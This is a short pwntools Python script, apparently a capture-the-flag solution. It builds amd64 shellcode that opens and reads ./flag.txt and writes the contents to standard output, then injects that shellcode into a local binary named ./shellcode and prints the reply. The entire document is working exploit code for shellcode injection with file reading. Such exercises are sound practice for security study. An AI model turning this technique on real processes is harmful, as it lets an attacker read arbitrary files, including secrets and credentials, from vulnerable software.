from pwn import *

context.arch = 'amd64'

flag_path = b"./flag.txt"
size = 0x80
buf = 'rsp'

sc = shellcraft.open(flag_path)
sc += shellcraft.read('rax', buf, size)
sc += shellcraft.write(1, buf, size)

shellcode = asm(sc)

p = process(b"./shellcode")

p.send(shellcode)
print(p.recv(64))
